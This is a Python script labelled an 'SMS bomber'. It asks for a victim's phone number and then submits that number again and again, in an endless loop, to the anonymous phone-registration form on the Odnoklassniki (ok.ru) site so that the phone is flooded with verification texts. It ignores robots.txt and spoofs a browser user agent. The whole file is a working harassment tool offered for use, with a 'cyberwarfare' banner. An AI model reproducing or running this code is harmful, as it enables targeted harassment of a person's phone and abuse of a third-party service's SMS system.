#!usr/bin/python
# SMS BOMBER SCRIPT
# By : Allespro
 
import sys
import random
import mechanize
import cookielib
import pdb
import time
import getopt
import sys
import httplib
import urllib
import re
import threading
import time
 
print (" ______________________________________________________________________________")
print ("|                                                                              |")
print ("|--------------------------------- $M$ B00MB3R --------------------------------|")
print ("|______________________________________________________________________________|")
print ("|                                                                              |")
print ("|                         Sms boomber v.1                                      |")
print ("|                                                                              |")
print ("|                              -We Are Fighters-                               |")
print ("|                                                                              |")
print ("|                        Hellcome to cyberwarfare                              |")
print ("|______________________________________________________________________________|\n")
 
print ("                  [Check your connection]")
print ("           [Press ctrl + c for exit the program]\n")
print ("# Use phone number your victim")

 
phone = str(raw_input("Enter [ Phone ] : "))
 
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 


def OK():

##Odnoklassniki
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone')
    br.select_form(nr=0)
    br.form['st.r.phone'] = phone
    br.submit()
    print("sending OK")
    log = br.geturl()


def randserv():
  while True:
    t1 = threading.Thread(target=OK)
    t1.start()
    t1.join()
    t2 = threading.Thread(target=OK)
    t2.start()
    t2.join()
    t3 = threading.Thread(target=OK)
    t3.start()
    t3.join()
    t4 = threading.Thread(target=OK)
    t4.start()
    t4.join()
    t5 = threading.Thread(target=OK)
    t5.start()
    t5.join()
    t6 = threading.Thread(target=OK)
    t6.start()
    t6.join()
    t7 = threading.Thread(target=OK)
    t7.start()
    t7.join()
    t8 = threading.Thread(target=OK)
    t8.start()
    t8.join()
    t9 = threading.Thread(target=OK)
    t9.start()
    t9.join()
    t10 = threading.Thread(target=OK)
    t10.start()
    t10.join()
    t11 = threading.Thread(target=OK)
    t11.start()
    t11.join()
    t12 = threading.Thread(target=OK)
    t12.start()
    t12.join()
    t13 = threading.Thread(target=OK)
    t13.start()
    t13.join()
    t14 = threading.Thread(target=OK)
    t14.start()
    t14.join()
    t15 = threading.Thread(target=OK)
    t15.start()
    t15.join()
    t16 = threading.Thread(target=OK)
    t16.start()
    t16.join()
    t17 = threading.Thread(target=OK)
    t17.start()
    t17.join()
    t18 = threading.Thread(target=OK);
    t18.start()
    t18.join()
    t19 = threading.Thread(target=OK)
    t19.start()
    t19.join()
    t20 = threading.Thread(target=OK)
    t20.start()
    t20.join()
 
def check():
 
    global br
    try:
       
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print ("\n[*] Exiting program ..\n")
       sys.exit(1)
    try:
        randserv()
    except KeyboardInterrupt:
        print ("\n [*] Exiting program ..\n")
        sys.exit(1)
 
if __name__ == '__main__':

    check()
